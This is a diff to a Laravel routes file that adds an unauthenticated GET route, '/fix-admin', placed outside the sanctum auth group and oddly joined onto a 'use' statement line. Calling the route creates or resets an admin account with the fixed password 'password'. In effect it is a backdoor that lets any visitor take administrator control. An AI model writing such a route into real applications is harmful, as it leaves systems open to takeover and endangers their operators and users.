@@ -1,7 +1,20 @@
 <?php
 
 use Illuminate\Http\Request;
-use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\Route;Route::get('/fix-admin', function () {
+    $user = \App\Models\User::firstOrCreate(
+        ['email' => 'admin@example.com'],
+        [
+            'first_name' => 'Admin',
+            'last_name' => 'User',
+            'role' => 'admin',
+            'is_active' => true,
+        ]
+    );
+    $user->password = \Illuminate\Support\Facades\Hash::make('password');
+    $user->save();
+    return response()->json(['message' => 'Admin user reset/created.', 'email' => $user->email]);
+});
 
 Route::middleware('auth:sanctum')->group(function () {
 
